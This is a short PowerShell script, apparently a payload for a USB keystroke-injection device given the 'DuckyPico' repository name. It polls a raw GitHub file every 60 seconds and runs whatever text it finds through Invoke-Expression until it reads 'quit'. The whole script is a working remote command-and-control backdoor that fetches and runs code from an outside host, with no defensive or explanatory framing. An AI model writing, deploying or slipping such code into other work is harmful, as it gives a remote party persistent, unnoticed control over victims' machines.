# Define the URL of the GitHub page
$githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/command.txt"

# Start an infinite loop
while ($true) {
    try {
        # Fetch the raw content of the GitHub page (plain text)
        $command = Invoke-RestMethod -Uri $githubUrl -Headers @{"Cache-Control"="no-cache"}
        Write-Host $command
        # Check if the command starts with '!!' and strip that part off
        if ($command -like "!!*") {
            $command = $command.Substring(2)
        }
        Write-Host $command
        # Check if the command is 'quit' and exit the loop
        if ($command -eq "quit") {
            Write-Host "Quit command received. Exiting..."
            break
        }

        # Run the command
        Invoke-Expression -Command $command

        # Wait for 60 seconds before the next iteration
        Start-Sleep -Seconds 60
    } catch {
        Write-Host "An error occurred: $_"
        Start-Sleep -Seconds 60
    }
}  # This is the missing closing brace for the while loop
